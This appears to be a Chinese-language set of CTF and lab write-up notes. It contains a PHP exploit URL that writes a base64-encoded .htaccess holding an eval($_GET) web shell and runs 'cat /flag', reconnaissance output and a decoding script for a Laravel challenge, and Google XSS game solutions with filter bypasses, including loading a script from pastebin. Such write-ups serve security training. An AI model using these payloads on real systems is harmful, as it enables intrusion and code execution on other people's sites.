http://192.168.99.100:32772/?a=system('cat %2fflag');exit;&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw%2FcGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c<<&filename=php://filter/write=convert.base64-decode/resource=.htaccess
```



### 广外2019

### laravel

```
[11:36:18] 301 -  338B  - /laravel/public/css  ->  http://183.129.189.60:10006/laravel/public/css/
[11:36:25] 200 -    0B  - /laravel/public/favicon.ico
[11:36:31] 200 -   25B  - /laravel/public/index.php
[11:36:31] 301 -  337B  - /laravel/public/js  ->  http://183.129.189.60:10006/laravel/public/js/
[11:36:45] 200 -  253B  - /laravel/public/robots.txt
[11:36:53] 200 -    1KB - /laravel/public/web.config
```



web.config

```xml
<configuration>
  <system.webServer>
    <rewrite>
      <rules>
        <rule name="Imported Rule 1" stopProcessing="true">
          <match url="^(.*)/$" ignoreCase="false" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
          </conditions>
          <action type="Redirect" redirectType="Permanent" url="/{R:1}" />
        </rule>
        <rule name="Imported Rule 2" stopProcessing="true">
          <match url="^" ignoreCase="false" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
            <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
          </conditions>
          <action type="Rewrite" url="index.php" />
        </rule>
      </rules>
    </rewrite>
  </system.webServer>
</configuration>
```



robots.txt

```python
User-agent: *
Disallow: /u_c4nNot_s3e_me

Notice:
l = len(m)
for i in range(l):
	num = (((m[i])+i) % 128 +128) % 128
	code += chr(num)
for i in range(l-1):
	code[i] = code[i]^code[i+1]
with open("u_c4nNot_s3e_me","wb") as f:
	for i in code:
		f.write(i)
```

```python
s=b""
with open("u_c4nNot_s3e_me","rb") as f:
    s=f.read()
code=[0]*len(s)
for i in range(len(s)):
    code[i]=int(s[i])
for i in range(len(s)-2,-1,-1):
    code[i]=(int(code[i])^int(code[i+1]))
for i in range(len(code)):
    print(chr((code[i]-i+128)%128),end="")


```



```php
<?php public function index(){ echo 'Welcome to Hacker World !; if (isset($_GET['z'])){$z = $_GET['z']; unserialize($z);}}
```

百度一下拿到shell



### 你的名字

```
 **Parse error:** syntax error, unexpected T_STRING, expecting '{' in **\var\WWW\html\test.php** on line **13** 
```

过滤file

## google xss

### level1

`<script>alert()</script>`

### level 2

`<img src="aaaaaaaa.jpg" onerror="alert()"></img>`

### level 3

代码审计发现

```javascript
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```



```javascript
#' onerror="alert()" '#1
```

### level 4

关键代码

```python
self.render_template('timer.html', { 'timer' : timer })
```

测试发现过滤了,`(,"`无法闭合

于是构造

`https://xss-game.appspot.com/level4/frame?timer=1'%2balert()%2b'1`

### level 5

`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()`

关键代码:`<a href="{{ next }}">Next >></a>`



### level 6



关键代码:

```javascript
    function includeGadget(url) {
      var scriptEl = document.createElement('script');
 
      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
 
      // Load this awesome gadget
      scriptEl.src = url;
 
      // Show log messages
      scriptEl.onload = function() { 
        setInnerText(document.getElementById("log"),  
          "Loaded gadget from " + url);
      }
      scriptEl.onerror = function() { 
        setInnerText(document.getElementById("log"),  
          "Couldn't load gadget from " + url);
      }
 
      document.head.appendChild(scriptEl);
    }
```



网页会根据#号后面的内容创建script标签

但是过滤了http和https为开始的url

但是当我们输入//xxx的时候,浏览器会把当前网址的协议当做这个网址的协议,于是我们成功绕过过滤

`//pastebin.com/raw/0eAVjVxh`



这一题data**协议也能做**